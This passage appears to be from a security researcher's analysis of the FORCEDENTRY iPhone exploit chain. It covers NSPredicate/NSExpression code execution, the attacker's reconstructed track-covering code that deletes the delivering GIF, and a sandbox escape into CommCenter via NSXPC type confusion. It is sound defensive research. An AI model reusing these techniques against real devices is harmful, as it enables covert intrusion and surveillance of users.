 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the arguments. In this case it will allocate an </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;object </span><span class="YDzVciBUld-c0">@&quot;abc&quot;</span><span>&nbsp;then invoke the </span><span class="YDzVciBUld-c0">stringByAppendingString:</span><span>&nbsp;selector passing the </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;</span><span class="YDzVciBUld-c0">@&quot;def&quot;</span><span>, which will evaluate to the </span><span class="YDzVciBUld-c0">NSString</span><span>&nbsp;</span><span class="YDzVciBUld-c0">@&quot;abcdef&quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>In addition to the </span><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;keyword there&#39;s </span><span class="YDzVciBUld-c0">CAST</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;which allows full reflection-based access to all Objective-C types (as opposed to just being able to invoke selectors on literal strings and integers):</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; &quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">FUNCTION(CAST(&#39;NSFileManager&#39;, &#39;Class&#39;), &#39;defaultManager&#39;)&quot;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Here we can get access to the </span><span class="YDzVciBUld-c0">NSFileManager</span><span>&nbsp;class and call the </span><span class="YDzVciBUld-c0">defaultManager</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;selector to get a reference to a process&#39;s shared file manager instance.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>These keywords exist in the string representation of </span><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">NSExpressions</span><span>. Parsing those strings involves creating a graph of </span><span class="YDzVciBUld-c0">NSExpression</span><span>&nbsp;objects, </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;objects and their subclasses like </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. It&#39;s a serialized version of such a graph which is present in the JBIG2 bitmap.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">NSPredicates</span><span>&nbsp;using the </span><span class="YDzVciBUld-c0">FUNCTION</span><span>&nbsp;keyword are effectively Objective-C scripts. With some tricks it&#39;s possible to build nested function calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to the 2019 </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://realworldctf.com/">Real World CTF</a></span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://github.com/ChiChou/DezhouInstrumenz/">DezhouInstrumenz</a></span><span>&nbsp;challenge, which would evaluate an attacker supplied </span><span class="YDzVciBUld-c0">NSExpression</span><span>&nbsp;format string. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">writeup by the challenge author</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is a great introduction to these ideas and I&#39;d strongly recommend reading that now if you haven&#39;t. The rest of this post builds on the tricks described in that post.</span></p><h2 class="YDzVciBUld-c7" id="h.lu8fbgty57ln"><span class="YDzVciBUld-c9 YDzVciBUld-c3">A tale of two parts</span></h2>
 <p class="YDzVciBUld-c4"><span>The only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an embedded </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. No attempt is made to get native code execution, ROP, JOP or any similar technique.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Prior to iOS 14.5 the </span><span class="YDzVciBUld-c0">isa</span><span>&nbsp;field of an Objective-C object was not protected by Pointer Authentication Codes (</span><span class="YDzVciBUld-c0">PAC)</span><span>, </span><span>so the JBIG2 machine builds a fake Objective-C object with a fake </span><span class="YDzVciBUld-c0">isa</span><span>&nbsp;such that the invocation of the </span><span class="YDzVciBUld-c0">dealloc</span><span>&nbsp;selector causes the deserialization and evaluation of the </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>. This is very similar to the technique used by </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html">Samuel in the 2020 SLOP post</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;has two purposes:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Firstly, it allocates and leaks an </span><span class="YDzVciBUld-c0">ASMKeepAlive</span><span>&nbsp;object then tries to cover its tracks by finding and deleting the </span><span class="YDzVciBUld-c0">.gif</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;file which delivered the exploit.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Secondly, it builds a payload </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object then triggers a logic bug to get that </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object evaluated in the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;process, reachable from the </span><span class="YDzVciBUld-c0">IMTranscoderAgent</span><span>&nbsp;sandbox via the </span><span class="YDzVciBUld-c0">com.apple.commcenter.xpc</span><span>&nbsp;</span><span class="YDzVciBUld-c0">NSXPC</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;service.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Let&#39;s look at those two parts separately:</span></p><h2 class="YDzVciBUld-c7" id="h.t2uistlubhwq"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Covering tracks</span></h2>
 <p class="YDzVciBUld-c4"><span>The outer level </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>&nbsp;calls </span><span class="YDzVciBUld-c0">performSelectorOnMainThread:withObject:waitUntilDone</span><span>&nbsp;which in turn calls </span><span class="YDzVciBUld-c0">makeObjectsPerformSelector:@&quot;expressionValueWithObject:context:&quot;</span><span>&nbsp;on an </span><span class="YDzVciBUld-c0">NSArray</span><span>&nbsp;of four </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>. This allows the four independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;to be evaluated sequentially.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>With some manual cleanup we can recover pseudo-Objective-C versions of the serialized </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The first one does this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[AMSKeepAlive alloc] initWithName:&quot;KA&quot;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This allocates and then </span><span>leaks an </span><span class="YDzVciBUld-c0">AppleMediaServices</span><span>&nbsp;</span><span class="YDzVciBUld-c0">KeepAlive</span><span>&nbsp;object</span><span>. The exact purpose of this is unclear.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The second entry does this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[NSFileManager defaultManager] _web_removeFileOnlyAtPath: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [@&quot;/tmp/com.apple.messages&quot; stringByAppendingPathComponent:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [ [ [ [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [NSFileManager defaultManager]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; allObjects</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; filteredArrayUsingPredicate:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [NSPredicate predicateWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [@&quot;SELF ENDSWITH &#39;&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stringByAppendingString: &quot;XXX.gif&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stringByAppendingString: &quot;&#39;&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; ] &nbsp; ] ] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; firstObject</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span>Reading these single expression </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is a little tricky; breaking that down into a more procedural form it&#39;s equivalent to this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSFileManager* fm = [NSFileManager defaultManager];</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSDirectoryEnumerator* dir_enum;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">dir_enum = [fm enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSArray* allTmpFiles = [dir_enum allObjects];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* filter;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filter = [&quot;@&quot;SELF ENDSWITH &#39;&quot; stringByAppendingString: &quot;XXX.gif&quot;];</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filter = [filter stringByAppendingString: &quot;&#39;&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSPredicate* pred;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">pred = [NSPredicate predicateWithFormat: filter]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSArray* matches;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">matches = [allTmpFiles filteredArrayUsingPredicate: pred];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* gif_subpath = [matches firstObject];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* root = @&quot;/tmp/com.apple.messages&quot;;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* full_path;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">full_path = [root stringByAppendingPathComponent: gifSubpath];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[fm _web_removeFileOnlyAtPath: full_path];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This finds the </span><span class="YDzVciBUld-c0">XXX.gif</span><span>&nbsp;file used to deliver the exploit which iMessage has stored somewhere under the </span><span class="YDzVciBUld-c0">/tmp/com.apple.messages</span><span>&nbsp;</span><span>folder and deletes it</span><span>.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The other two </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;build a payload and then trigger its evaluation in </span><span class="YDzVciBUld-c0">CommCenter</span><span>. For that we need to look at </span><span class="YDzVciBUld-c0">NSXPC</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p><h2 class="YDzVciBUld-c7" id="h.3sby3b68al28"><span class="YDzVciBUld-c3 YDzVciBUld-c9">NSXPC</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">NSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one process which transparently forward method calls to the &quot;real&quot; object in another process:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"></p>
  
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1437/image1%286%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png" border="0" alt="" style="max-height: 750; max-width: 600px;" title="" /></a></span></p>
 <p class="YDzVciBUld-c16"><span class="YDzVciBUld-c13 YDzVciBUld-c3">https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>I say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process boundaries. Any object &quot;exported&quot; via </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;must also define a </span><span class="YDzVciBUld-c0">protocol</span><span>&nbsp;which designates which methods can be invoked and the allowable types for each argument. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7">NSXPC programming guide</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;further explains the extra handling required for methods which require collections and other edge cases.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html">the fully-remote attack surface of the iPhone</a></span><span>. An important observation in that post was that </span><span class="YDzVciBUld-c14">subclasses of classes with any level of inheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This means that any </span><span class="YDzVciBUld-c0">protocol</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object which declares a particular type for a field will also, by design, accept any subclass of that type.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which is the vast majority of all Objective-C classes.</span></p><h2 class="YDzVciBUld-c7" id="h.v64ixuc668lc"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Grep to the rescue</span></h2>
 <p class="YDzVciBUld-c4"><span>This is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://github.com/nst/RuntimeBrowser/">RuntimeBrowser</a></span><span>&nbsp;and </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="http://stevenygard.com/projects/class-dump/">classdump</a></span><span>&nbsp;can parse the static protocol definitions and output human-readable source code. Grepping the output of RuntimeBrowser like this is sufficient to find dozens of cases of </span><span class="YDzVciBUld-c0">NSObject</span><span>&nbsp;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">pointers in Objective-C protocols:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; $ egrep -Rn &quot;\(NSObject \*\)arg&quot; *</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Not all the results are necessarily exposed via </span><span class="YDzVciBUld-c0">NSXPC</span><span>, but some clearly are, including the following two matches in </span><span class="YDzVciBUld-c0">CoreTelephony.framework</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">Frameworks/CoreTelephony.framework/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">CTXPCServiceSubscriberInterface-Protocol.h:39:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">-(void)evaluateMobileSubscriberIdentity:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; (CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;identity:(NSObject *)arg2</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;completion:(void (^)(NSError *))arg3;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">Frameworks/CoreTelephony.framework/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">CTXPCServiceCarrierBundleInterface-Protocol.h:13:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">-(void)setWiFiCallingSettingPreferences:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;key:(NSString *)arg2</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;value:(NSObject *)arg3</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;completion:(void (^)(NSError *))arg4;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">evaluateMobileSubscriberIdentity</span><span>&nbsp;string appears in the list of selector-like strings we first saw when running strings on the </span><span class="YDzVciBUld-c0">bplist00</span><span>. Indeed, looking at the parsed and beautified </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;we see it doing this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [ [CoreTelephonyClient alloc] init]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; context:X</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; evaluateMobileSubscriberIdentity:Y]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This is a wrapper around the lower-level </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;code and the argument passed as </span><span class="YDzVciBUld-c0">Y</span><span>&nbsp;above to the CoreTelephonyClient method corresponds to the </span><span class="YDzVciBUld-c0">identity:(NSObject *)arg2</span><span>&nbsp;argument passed via </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;to </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;(which is the process that hosts </span><span class="YDzVciBUld-c0">com.apple.commcenter.xpc</span><span>, the </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;service underlying the </span><span class="YDzVciBUld-c0">CoreTelephonyClient</span><span>). Since the parameter is explicitly named as </span><span class="YDzVciBUld-c0">NSObject*</span><span>&nbsp;we can in fact pass any subclass of </span><span class="YDzVciBUld-c0">NSObject*</span><span>, including an </span><span class="YDzVciBUld-c0">NSPredicate</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">! Game over?</span></p><h2 class="YDzVciBUld-c7" id="h.7ums8k4ivkbp"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Parsing vs Evaluation</span></h2>
 <p class="YDzVciBUld-c4"><span>It&#39;s not quite that easy. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">DezhouInstrumentz writeup</a></span><span>&nbsp;discusses this attack surface and notes that there&#39;s an extra, specific mitigation. When an </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;is deserialized by its </span><span class="YDzVciBUld-c0">initWithCoder:</span><span>&nbsp;implementation it sets a flag which disables evaluation of the predicate until the </span><span class="YDzVciBUld-c0">allowEvaluation</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;method is called.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>So whilst you certainly can pass an </span><span class="YDzVciBUld-c0">NSPredicate*</span><span>&nbsp;as the </span><span class="YDzVciBUld-c0">identity</span><span>&nbsp;argument across NSXPC and get it deserialized in </span><span class="YDzVciBUld-c0">CommCenter,</span><span>&nbsp;</span><span>the implementation of </span><span class="YDzVciBUld-c0">evaluateMobileSubscriberIdentity:</span><span>&nbsp;in </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;is definitely not going to call </span><span class="YDzVciBUld-c0">allowEvaluation:</span><span>&nbsp; to make the predicate safe for evaluation then </span><span class="YDzVciBUld-c0">evaluateWithObject:</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;and then evaluate it.</span></p><h2 class="YDzVciBUld-c7" id="h.34h1kqwr3d8t"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Old techniques, new tricks</span></h2>
 <p class="YDzVciBUld-c4"><span>From the exploit we can see that they in fact pass an </span><span class="YDzVciBUld-c0">NSArray</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;with two elements:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[0] = AVSpeechSynthesisVoice</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[1] = PTSection {rows = NSArray { [0] = PTRow() }</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
